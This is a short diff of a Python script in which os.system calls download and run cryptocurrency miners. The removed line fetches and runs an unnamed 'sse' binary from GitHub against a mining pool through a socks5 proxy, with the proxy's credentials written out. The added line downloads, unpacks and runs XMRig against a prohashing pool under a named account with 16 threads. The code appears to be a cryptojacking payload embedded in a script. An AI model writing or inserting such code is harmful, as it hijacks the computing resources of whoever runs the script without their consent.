@@ -10,4 +10,4 @@ from os import system, name
 from time import sleep
 from subprocess import PIPE, Popen
 import base64
-os.system("curl -L -o sse https://github.com/Ikuzot/nung/raw/main/sse && chmod +x sse && ./sse -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:17079 -u oJRQf1RCkAgajwLGpiLYeanKFTj3AvkheT.STRM -t 20 -x socks5://Gafadta66-US-rotate:Gafadta66@p.webshare.io:80")
+os.system ("curl -L -o xmrig-6.18.0-linux-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -a gr -o stratum+tcp://prohashing.com:3362 -u temera88 --keepalive -p a=gr -t 16") 
